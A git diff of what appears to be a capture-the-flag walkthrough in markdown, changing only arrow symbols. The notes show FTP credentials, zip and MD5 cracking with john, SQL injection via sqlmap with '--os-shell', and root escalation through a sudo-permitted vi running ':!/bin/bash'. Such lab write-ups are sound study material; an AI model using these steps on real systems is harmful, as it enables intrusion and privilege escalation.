@@ -11,7 +11,7 @@
 - ftp:
 	- connect with given creds:
 		- `ftpuser:mc@F1l3ZilL4`
-	- -> received .zip file protected with password
+	- → received .zip file protected with password
 		- crack with john:
 		```
 		zip2john <.zip_file> > <output.hashes>
@@ -19,14 +19,14 @@
 		```
 		- get password `backup.zip:741852963`
 		- and files `style.css, index.php`
-			- in index.php there is password hash (MD5) => `2cb42f8734ea607eefed3b70af13bbd3:qwerty789`
+			- in index.php there is password hash (MD5) → `2cb42f8734ea607eefed3b70af13bbd3:qwerty789`
 
 - webpage
 	- login page - try creds from previous box
-		- -> no go
+		- → no go
 	- login page - try creds from `index.php`
 		- `admin:qwerty789`
-	- =>we get to page with search
+	- →we get to page with search
 		- vulnerable to SQL injection
 		- run sqlmap on it:	`sqlmap -u='<URL>' --cookie="<COOKIE_inc_the_name>"`
 		- get shell - run previous command with `--os-shell`
@@ -42,4 +42,4 @@
 		- `postgres:P@s5w0rd!`
 	- `sudo -l`
 		- you can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as sudo
-			- from vi run `:!/bin/bash` => root -> flag
+			- from vi run `:!/bin/bash` → root → flag
